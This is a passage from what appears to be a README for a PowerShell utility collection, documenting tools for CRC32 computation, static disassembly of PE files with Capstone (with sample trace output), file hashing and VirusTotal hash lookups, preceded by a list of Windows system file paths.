C:\Windows\System32\TpmInit.exe
C:\Windows\System32\userinit.exe
C:\Windows\System32\userinitext.dll
C:\Windows\System32\UXInit.dll
C:\Windows\System32\WimBootCompress.ini
C:\Windows\System32\wininet.dll
C:\Windows\System32\wininetlui.dll
C:\Windows\System32\wininit.exe
C:\Windows\System32\wininitext.dll
C:\Windows\System32\winipcfile.dll
C:\Windows\System32\winipcsecproc.dll
C:\Windows\System32\winipsec.dll
C:\Windows\SysWOW64\ieuinit.inf
C:\Windows\SysWOW64\regini.exe
C:\Windows\SysWOW64\secinit.exe
C:\Windows\SysWOW64\TpmInit.exe
C:\Windows\SysWOW64\userinit.exe
C:\Windows\SysWOW64\userinitext.dll
C:\Windows\SysWOW64\UXInit.dll
C:\Windows\SysWOW64\WimBootCompress.ini
C:\Windows\SysWOW64\wininet.dll
C:\Windows\SysWOW64\wininetlui.dll
C:\Windows\SysWOW64\wininitext.dll
C:\Windows\SysWOW64\winipcfile.dll
C:\Windows\SysWOW64\winipcsecproc.dll
C:\Windows\SysWOW64\winipsec.dll
```

### Get-CRC32

A simple wrapper for the undocumented RtlComputeCrc32 function.

```
# Example from string
C:\PS> $String = [System.Text.Encoding]::ASCII.GetBytes("Testing!")
C:\PS> Get-CRC32 -Buffer $String
C:\PS> 2392247274
```

### Trace-Execution

Uses the Capstone engine to recursively disassemble a PE (x32/x64) from it's entry point, effectively "following" execution flow. The following rules are observed:

- jmp's are taken if they fall in the PE address space
- call's are taken if they fall in the PE address space
- ret's are taken and use the return address stored by call instructions
- indirect call/jmp's are not taken
- conditional jmp's are not taken
- call/jmp's which reference a register are not taken

There are many many edge cases here which can make disassembly unreliable. As a general rule, the more addresses you disassemble, the less trustworthy the output is. The call table can be used as a reference to gauge the veracity of the output.

Since disassembly is static, working of a byte array, x32/x64 PE's can be disassembled regardless of the bitness of PowerShell.

```
PS C:\> Trace-Execution -Path .\Desktop\some.exe -InstructionCount 10

[>] 32-bit Image!

[?] Call table:

Address    Mnemonic Taken Reason
-------    -------- ----- ------
0x4AD0829A call     Yes   Relative offset call
0x4AD07CB7 call     No    Indirect call

[?] Instruction trace:

Size Address    Mnemonic Operands                    Bytes                   RegRead  RegWrite
---- -------    -------- --------                    -----                   -------  --------
   5 0x4AD0829A call     0x4ad07c89                  {232, 234, 249, 255...} {esp}
   2 0x4AD07C89 mov      edi, edi                    {139, 255, 249, 255...}
   1 0x4AD07C8B push     ebp                         {85, 255, 249, 255...}  {esp}    {esp}
   2 0x4AD07C8C mov      ebp, esp                    {139, 236, 249, 255...}
   3 0x4AD07C8E sub      esp, 0x10                   {131, 236, 16, 255...}           {eflags}
   5 0x4AD07C91 mov      eax, dword ptr [0x4ad240ac] {161, 172, 64, 210...}
   4 0x4AD07C96 and      dword ptr [ebp - 8], 0      {131, 101, 248, 0...}            {eflags}
   4 0x4AD07C9A and      dword ptr [ebp - 4], 0      {131, 101, 252, 0...}            {eflags}
   1 0x4AD07C9E push     ebx                         {83, 101, 252, 0...}    {esp}    {esp}
   1 0x4AD07C9F push     edi                         {87, 101, 252, 0...}    {esp}    {esp}
   5 0x4AD07CA0 mov      edi, 0xbb40e64e             {191, 78, 230, 64...}
   5 0x4AD07CA5 mov      ebx, 0xffff0000             {187, 0, 0, 255...}
   2 0x4AD07CAA cmp      eax, edi                    {59, 199, 0, 255...}             {eflags}
   6 0x4AD07CAC jne      0x4ad1bc8c                  {15, 133, 218, 63...}   {eflags}
   1 0x4AD07CB2 push     esi                         {86, 133, 218, 63...}   {esp}    {esp}
   3 0x4AD07CB3 lea      eax, dword ptr [ebp - 8]    {141, 69, 248, 63...}
   1 0x4AD07CB6 push     eax                         {80, 69, 248, 63...}    {esp}    {esp}
   6 0x4AD07CB7 call     dword ptr [0x4ad01150]      {255, 21, 80, 17...}    {esp}
   3 0x4AD07CBD mov      esi, dword ptr [ebp - 4]    {139, 117, 252, 0...}
   3 0x4AD07CC0 xor      esi, dword ptr [ebp - 8]    {51, 117, 248, 0...}             {eflags}
```

### Calculate-Hash

PowerShell v2 compatible script to calculate file hashes. I quickly scripted this together because Get-FileHash is only available in v4+.

```
Get the SHA512 hash of "C:\Some\File.path".
C:\PS> Calculate-Hash -Path C:\Some\File.path -Algorithm SHA512
```

### Check-VTFile

Submit SHA256 hash of a file to Virus Total and retrieve the scan report if the hash is known. This requires you to get a, free, VirusTotal API key. Again, lot's of better projects out there for this but not PowerShell v2 compatible.

```
C:\PS> Check-VTFile -Path C:\Some\File.path
```
